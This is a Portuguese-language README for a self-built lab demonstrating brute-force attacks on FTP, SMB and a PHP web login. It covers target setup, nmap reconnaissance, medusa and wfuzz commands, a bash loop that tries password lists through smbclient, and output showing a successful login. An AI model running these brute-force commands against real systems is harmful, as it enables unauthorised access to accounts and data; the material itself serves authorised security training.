# Mini-Lab: Brute-force em FTP, SMB e Web (WFuzz)

**Resumo**  
Projeto mini-lab para demonstrar um fluxo completo de reconhecimento e ataques de brute-force em três vetores: FTP, SMB e formulário web. Foi realizado com **2 máquinas** usando WSL (Kali Linux como atacante) e openSUSE (alvo). Os scripts utilizados e instruções de configuração estão neste repositório.

---

## Avisos importantes / Legal
- Este repositório é **apenas para fins educacionais** e deve ser usado **somente** em ambientes controlados e autorizados (seu próprio laboratório).  
- Executar brute-force contra sistemas sem autorização é ilegal e antiético.
- Tenha cuidado ao publicar wordlists, senhas ou logs. Remova credenciais antes de commitar.

---

## Ambiente usado
- Atacante: Kali Linux (WSL)
- Alvo: openSUSE (WSL)
- IP do alvo no laboratório (exemplo): `172.25.223.247`
- Ferramentas usadas (exemplos): `nmap`, `medusa`, `hydra`, `smbclient`, `smbpasswd`, `smbstatus`, `wfuzz`, `crackmapexec` (opcional), `impacket` (opcional).

---

## Preparando o alvo (openSUSE) — passos principais

> Esses passos foram utilizados no laboratório; adapte conforme sua distro.

1. Criar usuário do lab:
```bash
sudo useradd -m -s /bin/bash labuser
sudo passwd labuser   # use: EasierPassword@123 (exemplo)
```
2. Criar diretórios:
```bash
sudo mkdir -p /srv/lab/smbshare
sudo mkdir -p /srv/lab/ftpshare
sudo mkdir -p /home/labuser
sudo chown -R labuser:labuser /home/labuser
sudo chown -R labuser:labuser /srv/lab
sudo chmod -R 0755 /srv/lab'
```
3. Instalar serviços:
```bash
sudo zypper install -y samba vsftpd    # openSUSE example
# ou em Debian/Ubuntu:
# sudo apt update && sudo apt install -y samba vsftpd
```
4. Samba (/etc/samba/smb.conf) — exemplo mínimo usado:
```bash
[global]
   server string = LAB-SAMBA
   workgroup = WORKGROUP
   map to guest = Bad User
   log file = /var/log/samba/%m.log
   max log size = 50
   security = user
   server min protocol = SMB2
   server max protocol = SMB3
   smb ports = 445

[smbshare]
   path = /srv/lab/smbshare
   browseable = yes
   read only = no
   guest ok = no
   valid users = labuser
```
5. FTP (/etc/vsftpd.conf) — exemplo usado:
```bash
listen=YES
anonymous_enable=NO
local_enable=YES
write_enable=YES
chroot_local_user=YES
local_root=/srv/lab/ftpshare
pasv_enable=NO
ssl_enable=NO
xferlog_enable=YES
log_ftp_protocol=YES
vsftpd_log_file=/var/log/vsftpd.log
pam_service_name=vsftpd
allow_writeable_chroot=YES
```
6. Adicionar usuário Samba e iniciar serviços:
```bash
sudo smbpasswd -a labuser    # define/ativa senha smb
sudo systemctl restart smb nmb vsftpd
sudo systemctl status smb nmb vsftpd
```
## Reconhecimento inicial (exemplo)
Nesta etapa a ideia é identificar possíveis pontos de entrada.
utilizando o nmap para mapear portas abertas uma ferramenta muito boa para este tipo de mapeamento 

```bash
# nmap 172.25.223.247
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-15 17:05 -03
Nmap scan report for 172.25.223.247
Host is up (0.0000050s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds
```
[explain command](https://explainshell.com/explain?cmd=nmap+172.25.223.247+-v)
```bash
# nmap 172.25.223.247 -sC
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-15 17:07 -03
Nmap scan report for 172.25.223.247
Host is up (0.0000050s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8000/tcp open  http-alt
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Login Lab (PHP)
|_http-open-proxy: Proxy might be redirecting requests

Host script results:
|_nbstat: NetBIOS name: NOTE-TI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time:
|   date: 2025-10-15T20:07:44
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 28.75 seconds
```
[explain command](https://explainshell.com/explain?cmd=nmap+172.25.223.247+-sC)
com isso identificamos algumas portas junto com os serviços que estão rodando.

## Brute-force FTP (exemplo com Medusa)
neste caso o nosso alvo é vulnerável a um ataque de brute force então utilizaremos a ferramenta medusa para brute force em FTP,SMB e WEB 
caso ainda não tenha instalado pode usar o comando apt install medusa ou utilize o gerenciador de pacotes da sua distribuição 
# Instalar:
```bash
sudo apt install medusa
```
```bash
medusa -h 172.25.223.247 -U lists/users.txt -P lists/passwords.txt -M ftp -f
```
[explain command](https://explainshell.com/explain?cmd=medusa+-h+172.25.223.247+-U+lists%2Fusers.txt+-P+lists%2Fpasswords.txt+-M+ftp+-f)
## Brute-force SMB (smbclient / script)
quando estamos fazendo esse tipo de ataque é importante saber oq vc esta fazendo como funciona o protocolo e como se conectar até ele 
protocolo smb é bem vulnerável se configurado de forma incorreta o lab que fizemos não tem muitas medidas de segurança ent vamos tentar fazer um primeiro teste que seria tentar se conectar ao host que já sabemos para isso utilizamos smbclient
```bash
# smbclient -L 172.25.223.247
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        smbshare        Disk
        IPC$            IPC       IPC Service (LAB-SAMBA)
SMB1 disabled -- no workgroup available
```
[explain command](https://explainshell.com/explain?cmd=smbclient+-L+172.25.223.247)

apenas digitamos qualquer usuário e podemos identificar que tem uma pasta compartilhada com o nome smbshare com isso já temos 2 informações importantes

	- smb1 desativado
 	- nome da pasta de compartilhamento [smbshare]
ent podemos tentar conectar com smbv3 e como não temos login e nem senha percebemos recebemos access denied
```bash
# smbclient //172.25.223.247/smbshare -m SMB3 -U "admin"
Password for [WORKGROUP\admin]:
tree connect failed: NT_STATUS_ACCESS_DENIED
```
ent vamos utilizar isso para criar um script rápido e simples para fazer o brute force neste arquivo
```bash
users=( "admin" "administrador" "teste" "labuser" "user" )

password=( "senha" "password" "sennha@123" "EasierPassword@123" "admin@123" )

for u in "${users[@]}";do
   for p in "${password[@]}";do
       echo "testando $u - $p"
       smbclient //172.25.223.247/smbshare -m SMB3 -U "${u}%${p}"
       echo "------------------------------------------------------------"
   done
done
```
ao executar o script quando ele conseguir uma par que faz o login ele ja vai logar o smb e vc pode usar os comandos para navegar 

```bash
testando labuser - password
session setup failed: NT_STATUS_LOGON_FAILURE
------------------------------------------------------------
testando labuser - sennha@123
session setup failed: NT_STATUS_LOGON_FAILURE
------------------------------------------------------------
testando labuser - EasierPassword@123
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Oct 15 11:41:29 2025
  ..                                  D        0  Wed Oct 15 11:41:29 2025
  senhas.txt                          N       33  Wed Oct 15 11:41:29 2025

                1055762868 blocks of size 1024. 1001491212 blocks available
smb: \>
```
ao executar o script quando conseguir credenciais validas o login e feito de forma automatica


## Brute-force Web (WFuzz)
#Identifique a requisição POST com o DevTools do navegador (aba Network). Supondo payload:

```bash
POST /login
username=... & password=...
```
Comando WFuzz (exemplo):
```bash
wfuzz -c -z file,user.txt -z file,password.txt -d "username=FUZZ&password=FUZ2Z"  http://172.25.223.247:8000/
```
> -c              : Output with colors
> -z payload                : Specify a payload for each FUZZ keyword used in the form of type,parameters,encoder.
> -d postdata      : Use post data (ex: "id=FUZZ&catalogue=1")

Para WFuzz, detecte respostas com tamanho/código diferente (ex.: redirecionamento 302 ou body length diferente).

Logue saídas relevantes em arquivos e proteja esses arquivos (não comitar em repositório).
